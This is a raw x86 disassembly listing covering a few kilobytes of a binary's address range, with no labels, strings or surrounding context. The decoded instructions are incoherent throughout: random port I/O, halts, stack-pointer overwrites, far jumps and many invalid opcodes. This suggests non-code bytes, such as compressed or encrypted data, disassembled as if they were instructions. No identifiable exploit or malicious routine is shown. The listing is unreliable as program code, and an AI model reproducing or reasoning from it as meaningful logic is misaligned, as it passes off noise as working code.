  40d671:	ee                   	out    %al,(%dx)
  40d672:	00 bc 2f 04 55 b4 2f 	add    %bh,0x2fb45504(%edi,%ebp,1)
  40d679:	4d                   	dec    %ebp
  40d67a:	39 83 82 75 47 20    	cmp    %eax,0x20477582(%ebx)
  40d680:	a8 14                	test   $0x14,%al
  40d682:	55                   	push   %ebp
  40d683:	ee                   	out    %al,(%dx)
  40d684:	f0 f9                	lock stc
  40d686:	1d 8a 8b 42 04       	sbb    $0x4428b8a,%eax
  40d68b:	02 63 d5             	add    -0x2b(%ebx),%ah
  40d68e:	58                   	pop    %eax
  40d68f:	93                   	xchg   %eax,%ebx
  40d690:	93                   	xchg   %eax,%ebx
  40d691:	57                   	push   %edi
  40d692:	c4 7a 5e             	les    0x5e(%edx),%edi
  40d695:	d8 cc                	fmul   %st(4),%st
  40d697:	37                   	aaa
  40d698:	87 fa                	xchg   %edi,%edx
  40d69a:	f4                   	hlt
  40d69b:	bc 54 35 f2 15       	mov    $0x15f23554,%esp
  40d6a0:	73 1c                	jae    0x40d6be
  40d6a2:	39 7b cd             	cmp    %edi,-0x33(%ebx)
  40d6a5:	a9 24 0e d7 fc       	test   $0xfcd70e24,%eax
  40d6aa:	ba 89 8f 3d 4a       	mov    $0x4a3d8f89,%edx
  40d6af:	71 16                	jno    0x40d6c7
  40d6b1:	46                   	inc    %esi
  40d6b2:	63 f9                	arpl   %edi,%ecx
  40d6b4:	07                   	pop    %es
  40d6b5:	38 9f 5f 16 ef e2    	cmp    %bl,-0x1d10e9a1(%edi)
  40d6bb:	c5 45 9f             	lds    -0x61(%ebp),%eax
  40d6be:	f9                   	stc
  40d6bf:	a0 89 ff a5 52       	mov    0x52a5ff89,%al
  40d6c4:	22 9a fc 4c ca 34    	and    0x34ca4cfc(%edx),%bl
  40d6ca:	8d 0e                	lea    (%esi),%ecx
  40d6cc:	99                   	cltd
  40d6cd:	3a 21                	cmp    (%ecx),%ah
  40d6cf:	41                   	inc    %ecx
  40d6d0:	e0 5f                	loopne 0x40d731
  40d6d2:	04 e9                	add    $0xe9,%al
  40d6d4:	32 7f fa             	xor    -0x6(%edi),%bh
  40d6d7:	30 e0                	xor    %ah,%al
  40d6d9:	d6                   	salc
  40d6da:	8b 82 7a f1 24 5b    	mov    0x5b24f17a(%edx),%eax
  40d6e0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d6e1:	38 1e                	cmp    %bl,(%esi)
  40d6e3:	35 02 48 da d2       	xor    $0xd2da4802,%eax
  40d6e8:	3b 79 b4             	cmp    -0x4c(%ecx),%edi
  40d6eb:	41                   	inc    %ecx
  40d6ec:	88 21                	mov    %ah,(%ecx)
  40d6ee:	89 ef                	mov    %ebp,%edi
  40d6f0:	c1 52 ac 30          	rcll   $0x30,-0x54(%edx)
  40d6f4:	11 f6                	adc    %esi,%esi
  40d6f6:	ec                   	in     (%dx),%al
  40d6f7:	69 d0 5c 25 64 9b    	imul   $0x9b64255c,%eax,%edx
  40d6fd:	a0 a4 64 27 15       	mov    0x152764a4,%al
  40d702:	c5 44 4d 5b          	lds    0x5b(%ebp,%ecx,2),%eax
  40d706:	eb 99                	jmp    0x40d6a1
  40d708:	1f                   	pop    %ds
  40d709:	90                   	nop
  40d70a:	71 7c                	jno    0x40d788
  40d70c:	da d1                	fcmovbe %st(1),%st
  40d70e:	2c ea                	sub    $0xea,%al
  40d710:	fc                   	cld
  40d711:	10 aa 00 c9 95 11    	adc    %ch,0x1195c900(%edx)
  40d717:	bc 62 39 50 ca       	mov    $0xca503962,%esp
  40d71c:	eb ca                	jmp    0x40d6e8
  40d71e:	ac                   	lods   %ds:(%esi),%al
  40d71f:	b8 8f 28 da 2e       	mov    $0x2eda288f,%eax
  40d724:	65 bc 8f 94 5b c5    	gs mov $0xc55b948f,%esp
  40d72a:	4d                   	dec    %ebp
  40d72b:	96                   	xchg   %eax,%esi
  40d72c:	0c 9e                	or     $0x9e,%al
  40d72e:	b4 b8                	mov    $0xb8,%ah
  40d730:	c0 9e 35 43 b5 7d 17 	rcrb   $0x17,0x7db54335(%esi)
  40d737:	12 06                	adc    (%esi),%al
  40d739:	0d b1 54 77 4b       	or     $0x4b7754b1,%eax
  40d73e:	4e                   	dec    %esi
  40d73f:	7f b3                	jg     0x40d6f4
  40d741:	fc                   	cld
  40d742:	48                   	dec    %eax
  40d743:	f0 c5 c3 bf          	(bad)
  40d747:	ce                   	into
  40d748:	c6                   	(bad)
  40d749:	d1 10                	rcll   $1,(%eax)
  40d74b:	b2 35                	mov    $0x35,%dl
  40d74d:	7d 11                	jge    0x40d760
  40d74f:	83 1d 58 ae b6 30 fc 	sbbl   $0xfffffffc,0x30b6ae58
  40d756:	3d 5a 70 84 18       	cmp    $0x1884705a,%eax
  40d75b:	cc                   	int3
  40d75c:	35 31 42 af 3a       	xor    $0x3aaf4231,%eax
  40d761:	39 7a 0d             	cmp    %edi,0xd(%edx)
  40d764:	72 d5                	jb     0x40d73b
  40d766:	ae                   	scas   %es:(%edi),%al
  40d767:	9b                   	fwait
  40d768:	12 da                	adc    %dl,%bl
  40d76a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d76b:	0c c1                	or     $0xc1,%al
  40d76d:	ca 41 6b             	lret   $0x6b41
  40d770:	68 2a da 33 dc       	push   $0xdc33da2a
  40d775:	a8 dc                	test   $0xdc,%al
  40d777:	05 61 04 7d 2f       	add    $0x2f7d0461,%eax
  40d77c:	09 d4                	or     %edx,%esp
  40d77e:	d1 0a                	rorl   $1,(%edx)
  40d780:	12 f1                	adc    %cl,%dh
  40d782:	75 39                	jne    0x40d7bd
  40d784:	01 01                	add    %eax,(%ecx)
  40d786:	9f                   	lahf
  40d787:	f7 16                	notl   (%esi)
  40d789:	0b b4 40 a0 be 5b ab 	or     -0x54a44160(%eax,%eax,2),%esi
  40d790:	a1 ec 6b 87 ea       	mov    0xea876bec,%eax
  40d795:	e7 d0                	out    %eax,$0xd0
  40d797:	6c                   	insb   (%dx),%es:(%edi)
  40d798:	34 1d                	xor    $0x1d,%al
  40d79a:	f5                   	cmc
  40d79b:	04 27                	add    $0x27,%al
  40d79d:	cb                   	lret
  40d79e:	4b                   	dec    %ebx
  40d79f:	5b                   	pop    %ebx
  40d7a0:	65 ee                	gs out %al,(%dx)
  40d7a2:	df ce                	(bad)
  40d7a4:	11 9b e2 20 7f e1    	adc    %ebx,-0x1e80df1e(%ebx)
  40d7aa:	97                   	xchg   %eax,%edi
  40d7ab:	70 f8                	jo     0x40d7a5
  40d7ad:	53                   	push   %ebx
  40d7ae:	e5 4b                	in     $0x4b,%eax
  40d7b0:	b0 78                	mov    $0x78,%al
  40d7b2:	af                   	scas   %es:(%edi),%eax
  40d7b3:	35 a4 eb d7 f5       	xor    $0xf5d7eba4,%eax
  40d7b8:	cf                   	iret
  40d7b9:	bb 5f f7 c5 48       	mov    $0x48c5f75f,%ebx
  40d7be:	c8 bc 20 53          	enter  $0x20bc,$0x53
  40d7c2:	40                   	inc    %eax
  40d7c3:	1d 43 63 a4 8d       	sbb    $0x8da46343,%eax
  40d7c8:	46                   	inc    %esi
  40d7c9:	f8                   	clc
  40d7ca:	ca 7b 09             	lret   $0x97b
  40d7cd:	ae                   	scas   %es:(%edi),%al
  40d7ce:	41                   	inc    %ecx
  40d7cf:	22 9c 87 d5 19 6a 44 	and    0x446a19d5(%edi,%eax,4),%bl
  40d7d6:	d5 d4                	aad    $0xd4
  40d7d8:	9a a9 fd df c9 2b 21 	lcall  $0x212b,$0xc9dffda9
  40d7df:	83 1c e0 74          	sbbl   $0x74,(%eax,%eiz,8)
  40d7e3:	4c                   	dec    %esp
  40d7e4:	63 77 83             	arpl   %esi,-0x7d(%edi)
  40d7e7:	8a 8b f1 17 d9 ce    	mov    -0x3126e80f(%ebx),%cl
  40d7ed:	bd b9 8c bc 5a       	mov    $0x5abc8cb9,%ebp
  40d7f2:	39 49 ba             	cmp    %ecx,-0x46(%ecx)
  40d7f5:	68 94 8e 15 ab       	push   $0xab158e94
  40d7fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40d7fb:	a1 06 7a fe 77       	mov    0x77fe7a06,%eax
  40d800:	98                   	cwtl
  40d801:	3a 71 e0             	cmp    -0x20(%ecx),%dh
  40d804:	6e                   	outsb  %ds:(%esi),(%dx)
  40d805:	31 25 6a 75 4e a3    	xor    %esp,0xa34e756a
  40d80b:	6d                   	insl   (%dx),%es:(%edi)
  40d80c:	7c e1                	jl     0x40d7ef
  40d80e:	6a b7                	push   $0xffffffb7
  40d810:	43                   	inc    %ebx
  40d811:	81 5b 9c ad cd b5 4b 	sbbl   $0x4bb5cdad,-0x64(%ebx)
  40d818:	cc                   	int3
  40d819:	2e 6a 17             	cs push $0x17
  40d81c:	a2 ce 1b 96 7e       	mov    %al,0x7e961bce
  40d821:	64 ed                	fs in  (%dx),%eax
  40d823:	43                   	inc    %ebx
  40d824:	24 f0                	and    $0xf0,%al
  40d826:	e4 f3                	in     $0xf3,%al
  40d828:	eb b5                	jmp    0x40d7df
  40d82a:	53                   	push   %ebx
  40d82b:	8f                   	(bad)
  40d82c:	38 23                	cmp    %ah,(%ebx)
  40d82e:	30 41 f0             	xor    %al,-0x10(%ecx)
  40d831:	68 75 70 d5 34       	push   $0x34d57075
  40d836:	3b bd d4 d1 c9 0e    	cmp    0xec9d1d4(%ebp),%edi
  40d83c:	25 3b 1b f2 43       	and    $0x43f21b3b,%eax
  40d841:	5b                   	pop    %ebx
  40d842:	e2 90                	loop   0x40d7d4
  40d844:	61                   	popa
  40d845:	be 51 f1 07 49       	mov    $0x4907f151,%esi
  40d84a:	89 9d 4f 4c aa 29    	mov    %ebx,0x29aa4c4f(%ebp)
  40d850:	b2 4c                	mov    $0x4c,%dl
  40d852:	b3 b0                	mov    $0xb0,%bl
  40d854:	c8 02 0f 27          	enter  $0xf02,$0x27
  40d858:	5d                   	pop    %ebp
  40d859:	65 93                	gs xchg %eax,%ebx
  40d85b:	a3 14 87 d8 e8       	mov    %eax,0xe8d88714
  40d860:	bd 03 7e dc e2       	mov    $0xe2dc7e03,%ebp
  40d865:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d866:	d6                   	salc
  40d867:	34 28                	xor    $0x28,%al
  40d869:	62 6a f9             	bound  %ebp,-0x7(%edx)
  40d86c:	28 0a                	sub    %cl,(%edx)
  40d86e:	19 f7                	sbb    %esi,%edi
  40d870:	a3 75 3a 98 2e       	mov    %eax,0x2e983a75
  40d875:	9c                   	pushf
  40d876:	d7                   	xlat   %ds:(%ebx)
  40d877:	ae                   	scas   %es:(%edi),%al
  40d878:	7f 1a                	jg     0x40d894
  40d87a:	6f                   	outsl  %ds:(%esi),(%dx)
  40d87b:	3b 45 ab             	cmp    -0x55(%ebp),%eax
  40d87e:	21 f9                	and    %edi,%ecx
  40d880:	4f                   	dec    %edi
  40d881:	38 be 38 56 e9 8e    	cmp    %bh,-0x7116a9c8(%esi)
  40d887:	37                   	aaa
  40d888:	1b d0                	sbb    %eax,%edx
  40d88a:	a8 40                	test   $0x40,%al
  40d88c:	52                   	push   %edx
  40d88d:	2c 42                	sub    $0x42,%al
  40d88f:	8b 82 82 f5 58 a3    	mov    -0x5ca70a7e(%edx),%eax
  40d895:	c4 62 2a             	les    0x2a(%edx),%esp
  40d898:	7e 1e                	jle    0x40d8b8
  40d89a:	bd 46 9d eb 27       	mov    $0x27eb9d46,%ebp
  40d89f:	86 2c 35 1d a3 c4 d2 	xchg   %ch,-0x2d3b5ce3(,%esi,1)
  40d8a6:	24 0d                	and    $0xd,%al
  40d8a8:	36 8b 8a f4 2b 3f 55 	mov    %ss:0x553f2bf4(%edx),%ecx
  40d8af:	46                   	inc    %esi
  40d8b0:	7d 61                	jge    0x40d913
  40d8b2:	b2 8a                	mov    $0x8a,%dl
  40d8b4:	d1 ff                	sar    $1,%edi
  40d8b6:	de 2f                	fisubrs (%edi)
  40d8b8:	c5 dd 47             	kxorb  (bad),%k4,%k4
  40d8bb:	62 19                	bound  %ebx,(%ecx)
  40d8bd:	6b 8b 3b 8d 04 e4 ab 	imul   $0xffffffab,-0x1bfb72c5(%ebx),%ecx
  40d8c4:	c5 8f da f5 f9 ce    	lds    -0x31060a26(%edi),%ecx
  40d8ca:	b2 fc                	mov    $0xfc,%dl
  40d8cc:	7e 28                	jle    0x40d8f6
  40d8ce:	ed                   	in     (%dx),%eax
  40d8cf:	bc 46 52 50 3a       	mov    $0x3a505246,%esp
  40d8d4:	74 bb                	je     0x40d891
  40d8d6:	56                   	push   %esi
  40d8d7:	1d 8f cd 0d 12       	sbb    $0x120dcd8f,%eax
  40d8dc:	76 e2                	jbe    0x40d8c0
  40d8de:	75 00                	jne    0x40d8e0
  40d8e0:	92                   	xchg   %eax,%edx
  40d8e1:	9e                   	sahf
  40d8e2:	c2 c1 8d             	ret    $0x8dc1
  40d8e5:	9c                   	pushf
  40d8e6:	b1 ce                	mov    $0xce,%cl
  40d8e8:	ef                   	out    %eax,(%dx)
  40d8e9:	51                   	push   %ecx
  40d8ea:	d8 f9                	fdivr  %st(1),%st
  40d8ec:	70 59                	jo     0x40d947
  40d8ee:	26 cd b6             	es int $0xb6
  40d8f1:	82 2e aa             	subb   $0xaa,(%esi)
  40d8f4:	01 dc                	add    %ebx,%esp
  40d8f6:	5f                   	pop    %edi
  40d8f7:	a9 fc 2e 5a 09       	test   $0x95a2efc,%eax
  40d8fc:	08 95 74 65 e9 e0    	or     %dl,-0x1f169a8c(%ebp)
  40d902:	de 52 78             	ficoms 0x78(%edx)
  40d905:	14 ae                	adc    $0xae,%al
  40d907:	03 9e 21 ed b9 6b    	add    0x6bb9ed21(%esi),%ebx
  40d90d:	78 ae                	js     0x40d8bd
  40d90f:	82 02 e6             	addb   $0xe6,(%edx)
  40d912:	36 e2 bd             	ss loop 0x40d8d2
  40d915:	6c                   	insb   (%dx),%es:(%edi)
  40d916:	be 1e dd 3e e6       	mov    $0xe63edd1e,%esi
  40d91b:	3f                   	aas
  40d91c:	8b a3 d1 6f 90 57    	mov    0x57906fd1(%ebx),%esp
  40d922:	bc c7 e9 f0 b0       	mov    $0xb0f0e9c7,%esp
  40d927:	3a a3 d7 61 66 27    	cmp    0x276661d7(%ebx),%ah
  40d92d:	c3                   	ret
  40d92e:	41                   	inc    %ecx
  40d92f:	c8 9b ea f2          	enter  $0xea9b,$0xf2
  40d933:	8f ca 8d 3f          	(bad)
  40d937:	c1 98 28 c4 e5 c5 30 	rcrl   $0x30,-0x3a1a3bd8(%eax)
  40d93e:	0f 34                	sysenter
  40d940:	b3 c1                	mov    $0xc1,%bl
  40d942:	21 8f 6d 56 f6 b4    	and    %ecx,-0x4b09a993(%edi)
  40d948:	f0 a9 2b a6 84 7c    	lock test $0x7c84a62b,%eax
  40d94e:	ab                   	stos   %eax,%es:(%edi)
  40d94f:	e6 dd                	out    %al,$0xdd
  40d951:	07                   	pop    %es
  40d952:	e2 5f                	loop   0x40d9b3
  40d954:	6c                   	insb   (%dx),%es:(%edi)
  40d955:	de b4 5d 73 ff 4a 13 	fidivs 0x134aff73(%ebp,%ebx,2)
  40d95c:	74 f0                	je     0x40d94e
  40d95e:	e2 8b                	loop   0x40d8eb
  40d960:	f1                   	int1
  40d961:	fd                   	std
  40d962:	5c                   	pop    %esp
  40d963:	9e                   	sahf
  40d964:	88 cf                	mov    %cl,%bh
  40d966:	68 1a d5 42 05       	push   $0x542d51a
  40d96b:	67 48                	addr16 dec %eax
  40d96d:	78 a3                	js     0x40d912
  40d96f:	76 9c                	jbe    0x40d90d
  40d971:	95                   	xchg   %eax,%ebp
  40d972:	cd d1                	int    $0xd1
  40d974:	bd 8b 01 93 16       	mov    $0x1693018b,%ebp
  40d979:	cf                   	iret
  40d97a:	68 19 0a 77 83       	push   $0x83770a19
  40d97f:	4c                   	dec    %esp
  40d980:	38 14 2b             	cmp    %dl,(%ebx,%ebp,1)
  40d983:	b1 12                	mov    $0x12,%cl
  40d985:	44                   	inc    %esp
  40d986:	87 f7                	xchg   %esi,%edi
  40d988:	18 1a                	sbb    %bl,(%edx)
  40d98a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d98b:	e3 fd                	jecxz  0x40d98a
  40d98d:	35 71 da 24 1f       	xor    $0x1f24da71,%eax
  40d992:	4d                   	dec    %ebp
  40d993:	5e                   	pop    %esi
  40d994:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d995:	2f                   	das
  40d996:	7d 04                	jge    0x40d99c
  40d998:	60                   	pusha
  40d999:	9b                   	fwait
  40d99a:	09 69 b8             	or     %ebp,-0x48(%ecx)
  40d99d:	da 1e                	ficompl (%esi)
  40d99f:	b7 d7                	mov    $0xd7,%bh
  40d9a1:	c2 91 81             	ret    $0x8191
  40d9a4:	f5                   	cmc
  40d9a5:	ef                   	out    %eax,(%dx)
  40d9a6:	ce                   	into
  40d9a7:	1a f7                	sbb    %bh,%dh
  40d9a9:	2d 65 f6 0f 87       	sub    $0x870ff665,%eax
  40d9ae:	cd 44                	int    $0x44
  40d9b0:	58                   	pop    %eax
  40d9b1:	5f                   	pop    %edi
  40d9b2:	24 7f                	and    $0x7f,%al
  40d9b4:	96                   	xchg   %eax,%esi
  40d9b5:	4a                   	dec    %edx
  40d9b6:	cf                   	iret
  40d9b7:	06                   	push   %es
  40d9b8:	d6                   	salc
  40d9b9:	ad                   	lods   %ds:(%esi),%eax
  40d9ba:	79 2f                	jns    0x40d9eb
  40d9bc:	23 83 a9 66 ab 94    	and    -0x6b549957(%ebx),%eax
  40d9c2:	26 52                	es push %edx
  40d9c4:	65 c5 41 c1          	lds    %gs:-0x3f(%ecx),%eax
  40d9c8:	60                   	pusha
  40d9c9:	9a ee 6c f9 b2 2e 57 	lcall  $0x572e,$0xb2f96cee
  40d9d0:	d0 f3                	shl    $1,%bl
  40d9d2:	dc 85 01 76 64 76    	faddl  0x76647601(%ebp)
  40d9d8:	10 19                	adc    %bl,(%ecx)
  40d9da:	20 54 71 7e          	and    %dl,0x7e(%ecx,%esi,2)
  40d9de:	39 01                	cmp    %eax,(%ecx)
  40d9e0:	12 ec                	adc    %ah,%ch
  40d9e2:	99                   	cltd
  40d9e3:	66 72 a8             	data16 jb 0x40d98e
  40d9e6:	27                   	daa
  40d9e7:	00 a3 23 dc 88 f9    	add    %ah,-0x67723dd(%ebx)
  40d9ed:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d9ee:	d6                   	salc
  40d9ef:	2a 6d 3e             	sub    0x3e(%ebp),%ch
  40d9f2:	00 b6 4a f6 24 c1    	add    %dh,-0x3edb09b6(%esi)
  40d9f8:	66 85 5a b3          	test   %bx,-0x4d(%edx)
  40d9fc:	fb                   	sti
  40d9fd:	7b 41                	jnp    0x40da40
  40d9ff:	c7                   	(bad)
  40da00:	f4                   	hlt
  40da01:	97                   	xchg   %eax,%edi
  40da02:	83 60 86 6c          	andl   $0x6c,-0x7a(%eax)
  40da06:	e7 c1                	out    %eax,$0xc1
  40da08:	bf dd a1 3a c8       	mov    $0xc83aa1dd,%edi
  40da0d:	68 f9 6b 8f 5f       	push   $0x5f8f6bf9
  40da12:	85 f1                	test   %esi,%ecx
  40da14:	cf                   	iret
  40da15:	f4                   	hlt
  40da16:	84 4c b0 b6          	test   %cl,-0x4a(%eax,%esi,4)
  40da1a:	98                   	cwtl
  40da1b:	99                   	cltd
  40da1c:	bb 74 c8 ac 34       	mov    $0x34acc874,%ebx
  40da21:	33 e2                	xor    %edx,%esp
  40da23:	91                   	xchg   %eax,%ecx
  40da24:	c5 6e 2d             	lds    0x2d(%esi),%ebp
  40da27:	09 ad 82 32 ca 17    	or     %ebp,0x17ca3282(%ebp)
  40da2d:	f6 74 ec 86          	divb   -0x7a(%esp,%ebp,8)
  40da31:	5a                   	pop    %edx
  40da32:	9f                   	lahf
  40da33:	9b                   	fwait
  40da34:	40                   	inc    %eax
  40da35:	68 a9 b6 93 9c       	push   $0x9c93b6a9
  40da3a:	ea 94 4c cb 8a 20 a9 	ljmp   $0xa920,$0x8acb4c94
  40da41:	40                   	inc    %eax
  40da42:	9b                   	fwait
  40da43:	40                   	inc    %eax
  40da44:	d7                   	xlat   %ds:(%ebx)
  40da45:	81 33 ab ae 70 03    	xorl   $0x370aeab,(%ebx)
  40da4b:	e7 d3                	out    %eax,$0xd3
  40da4d:	6e                   	outsb  %ds:(%esi),(%dx)
  40da4e:	94                   	xchg   %eax,%esp
  40da4f:	33 af 81 24 23 a0    	xor    -0x5fdcdb7f(%edi),%ebp
  40da55:	f0 fb                	lock sti
  40da57:	03 3f                	add    (%edi),%edi
  40da59:	93                   	xchg   %eax,%ebx
  40da5a:	d0 c1                	rol    $1,%cl
  40da5c:	f7 de                	neg    %esi
  40da5e:	1d 67 18 55 96       	sbb    $0x96551867,%eax
  40da63:	c4 75 a5             	les    -0x5b(%ebp),%esi
  40da66:	c9                   	leave
  40da67:	3d ee e7 9f 7f       	cmp    $0x7f9fe7ee,%eax
  40da6c:	09 55 ea             	or     %edx,-0x16(%ebp)
  40da6f:	b3 31                	mov    $0x31,%bl
  40da71:	0e                   	push   %cs
  40da72:	40                   	inc    %eax
  40da73:	95                   	xchg   %eax,%ebp
  40da74:	b1 1a                	mov    $0x1a,%cl
  40da76:	32 e3                	xor    %bl,%ah
  40da78:	9b                   	fwait
  40da79:	d3 06                	roll   %cl,(%esi)
  40da7b:	a3 d8 b9 85 4e       	mov    %eax,0x4e85b9d8
  40da80:	d1 15 5a f4 06 23    	rcll   $1,0x2306f45a
  40da86:	2f                   	das
  40da87:	ef                   	out    %eax,(%dx)
  40da88:	0e                   	push   %cs
  40da89:	89 b1 1a 66 d0 41    	mov    %esi,0x41d0661a(%ecx)
  40da8f:	81 89 3e 40 7b b0 96 	orl    $0x889aed96,-0x4f84bfc2(%ecx)
  40da96:	ed 9a 88 
  40da99:	e9 5c f0 b5 18       	jmp    0x18f6cafa
  40da9e:	65 25 38 ba 0d c6    	gs and $0xc60dba38,%eax
  40daa4:	93                   	xchg   %eax,%ebx
  40daa5:	d7                   	xlat   %ds:(%ebx)
  40daa6:	62 1a                	bound  %ebx,(%edx)
  40daa8:	2b 47 82             	sub    -0x7e(%edi),%eax
  40daab:	3a 5f c9             	cmp    -0x37(%edi),%bl
  40daae:	7c c3                	jl     0x40da73
  40dab0:	5f                   	pop    %edi
  40dab1:	94                   	xchg   %eax,%esp
  40dab2:	cf                   	iret
  40dab3:	7e a1                	jle    0x40da56
  40dab5:	73 b6                	jae    0x40da6d
  40dab7:	52                   	push   %edx
  40dab8:	a3 c7 a3 c4 44       	mov    %eax,0x44c4a3c7
  40dabd:	56                   	push   %esi
  40dabe:	80 df 17             	sbb    $0x17,%bh
  40dac1:	fe                   	(bad)
  40dac2:	21 3c 47             	and    %edi,(%edi,%eax,2)
  40dac5:	9a d3 eb 37 3b 02 c0 	lcall  $0xc002,$0x3b37ebd3
  40dacc:	16                   	push   %ss
  40dacd:	cd e2                	int    $0xe2
  40dacf:	1d e1 9e 59 09       	sbb    $0x9599ee1,%eax
  40dad4:	c6                   	(bad)
  40dad5:	7d cc                	jge    0x40daa3
  40dad7:	d4 de                	aam    $0xde
  40dad9:	cf                   	iret
  40dada:	89 90 99 d6 2e 5d    	mov    %edx,0x5d2ed699(%eax)
  40dae0:	ed                   	in     (%dx),%eax
  40dae1:	95                   	xchg   %eax,%ebp
  40dae2:	f4                   	hlt
  40dae3:	e8 8e e0 db fc       	call   0xfd1cbb76
  40dae8:	43                   	inc    %ebx
  40dae9:	f7 93 5c 03 16 30    	notl   0x3016035c(%ebx)
  40daef:	bd 19 dc fa fe       	mov    $0xfefadc19,%ebp
  40daf4:	cd 3b                	int    $0x3b
  40daf6:	d1 e3                	shl    $1,%ebx
  40daf8:	65 10 d3             	gs adc %dl,%bl
  40dafb:	ba d5 3c 80 0e       	mov    $0xe803cd5,%edx
  40db00:	e4 36                	in     $0x36,%al
  40db02:	ab                   	stos   %eax,%es:(%edi)
  40db03:	38 37                	cmp    %dh,(%edi)
  40db05:	85 61 45             	test   %esp,0x45(%ecx)
  40db08:	2c 42                	sub    $0x42,%al
  40db0a:	6f                   	outsl  %ds:(%esi),(%dx)
  40db0b:	d7                   	xlat   %ds:(%ebx)
  40db0c:	b8 76 7c 64 f1       	mov    $0xf1647c76,%eax
  40db11:	88 67 36             	mov    %ah,0x36(%edi)
  40db14:	1f                   	pop    %ds
  40db15:	08 9a 65 cf c8 4e    	or     %bl,0x4ec8cf65(%edx)
  40db1b:	08 24 23             	or     %ah,(%ebx,%eiz,1)
  40db1e:	b9 2f 2a 30 aa       	mov    $0xaa302a2f,%ecx
  40db23:	df da                	(bad)
  40db25:	4c                   	dec    %esp
  40db26:	5c                   	pop    %esp
  40db27:	73 73                	jae    0x40db9c
  40db29:	c0 d2 23             	rcl    $0x23,%dl
  40db2c:	5d                   	pop    %ebp
  40db2d:	ed                   	in     (%dx),%eax
  40db2e:	e8 7a 28 06 87       	call   0x874703ad
  40db33:	fb                   	sti
  40db34:	c6                   	(bad)
  40db35:	3e 3a 59 ef          	cmp    %ds:-0x11(%ecx),%bl
  40db39:	d6                   	salc
  40db3a:	cf                   	iret
  40db3b:	78 bd                	js     0x40dafa
  40db3d:	7b 2d                	jnp    0x40db6c
  40db3f:	0e                   	push   %cs
  40db40:	23 a5 37 56 91 c4    	and    -0x3b6ea9c9(%ebp),%esp
  40db46:	69 87 50 de ee c7 ed 	imul   $0x82e6ceed,-0x381121b0(%edi),%eax
  40db4d:	ce e6 82 
  40db50:	72 77                	jb     0x40dbc9
  40db52:	39 c9                	cmp    %ecx,%ecx
  40db54:	1b af ea ee dc f1    	sbb    -0xe231116(%edi),%ebp
  40db5a:	fc                   	cld
  40db5b:	ff                   	(bad)
  40db5c:	7a f9                	jp     0x40db57
  40db5e:	bd ac a8 cd 54       	mov    $0x54cda8ac,%ebp
  40db63:	60                   	pusha
  40db64:	8e 41 14             	mov    0x14(%ecx),%es
  40db67:	61                   	popa
  40db68:	5d                   	pop    %ebp
  40db69:	ae                   	scas   %es:(%edi),%al
  40db6a:	8a c1                	mov    %cl,%al
  40db6c:	6f                   	outsl  %ds:(%esi),(%dx)
  40db6d:	e2 45                	loop   0x40dbb4
  40db6f:	b1 de                	mov    $0xde,%cl
  40db71:	80 cb a5             	or     $0xa5,%bl
  40db74:	aa                   	stos   %al,%es:(%edi)
  40db75:	f8                   	clc
  40db76:	e9 7b ce 8b 4e       	jmp    0x4ecca9f6
  40db7b:	72 90                	jb     0x40db0d
  40db7d:	c7 b8 04 8e 8f       	xbegin 0x8fcee03a,(bad)
  40db82:	9a eb d0 51 96 5f 12 	lcall  $0x125f,$0x9651d0eb
  40db89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40db8a:	e4 53                	in     $0x53,%al
  40db8c:	18 f9                	sbb    %bh,%cl
  40db8e:	c5 6c 9c 44          	lds    0x44(%esp,%ebx,4),%ebp
  40db92:	00 f0                	add    %dh,%al
  40db94:	29 a5 a0 4c a4 75    	sub    %esp,0x75a44ca0(%ebp)
  40db9a:	ad                   	lods   %ds:(%esi),%eax
  40db9b:	24 00                	and    $0x0,%al
  40db9d:	cc                   	int3
  40db9e:	d8 31                	fdivs  (%ecx)
  40dba0:	7d f9                	jge    0x40db9b
  40dba2:	2b 63 f5             	sub    -0xb(%ebx),%esp
  40dba5:	13 07                	adc    (%edi),%eax
  40dba7:	fc                   	cld
  40dba8:	87 f6                	xchg   %esi,%esi
  40dbaa:	22 6a 93             	and    -0x6d(%edx),%ch
  40dbad:	0a 49 c2             	or     -0x3e(%ecx),%cl
  40dbb0:	f1                   	int1
  40dbb1:	f5                   	cmc
  40dbb2:	24 11                	and    $0x11,%al
  40dbb4:	6e                   	outsb  %ds:(%esi),(%dx)
  40dbb5:	b3 fb                	mov    $0xfb,%bl
  40dbb7:	04 ea                	add    $0xea,%al
  40dbb9:	34 c4                	xor    $0xc4,%al
  40dbbb:	39 f6                	cmp    %esi,%esi
  40dbbd:	54                   	push   %esp
  40dbbe:	e8 9c 1e e2 78       	call   0x7922fa5f
  40dbc3:	8b bf 4f 77 5b 96    	mov    -0x69a488b1(%edi),%edi
  40dbc9:	ad                   	lods   %ds:(%esi),%eax
  40dbca:	46                   	inc    %esi
  40dbcb:	b9 72 22 96 1b       	mov    $0x1b962272,%ecx
  40dbd0:	8a 79 d4             	mov    -0x2c(%ecx),%bh
  40dbd3:	51                   	push   %ecx
  40dbd4:	0e                   	push   %cs
  40dbd5:	3e 6d                	ds insl (%dx),%es:(%edi)
  40dbd7:	bc 10 35 0f cc       	mov    $0xcc0f3510,%esp
  40dbdc:	d9 88 8e 4c 11 ae    	(bad) -0x51eeb372(%eax)
  40dbe2:	70 96                	jo     0x40db7a
  40dbe4:	3e b3 9b             	ds mov $0x9b,%bl
  40dbe7:	03 fb                	add    %ebx,%edi
  40dbe9:	77 09                	ja     0x40dbf4
  40dbeb:	ea aa 25 9f 46 ed c3 	ljmp   $0xc3ed,$0x469f25aa
  40dbf2:	f5                   	cmc
  40dbf3:	3e 80 d0 d8          	ds adc $0xd8,%al
  40dbf7:	89 d1                	mov    %edx,%ecx
  40dbf9:	b1 df                	mov    $0xdf,%cl
  40dbfb:	6e                   	outsb  %ds:(%esi),(%dx)
  40dbfc:	29 21                	sub    %esp,(%ecx)
  40dbfe:	9c                   	pushf
  40dbff:	26 db e2             	es fnclex
  40dc02:	de e2                	fsubp  %st,%st(2)
  40dc04:	43                   	inc    %ebx
  40dc05:	12 07                	adc    (%edi),%al
  40dc07:	42                   	inc    %edx
  40dc08:	e9 d5 96 10 f7       	jmp    0xf75172e2
  40dc0d:	56                   	push   %esi
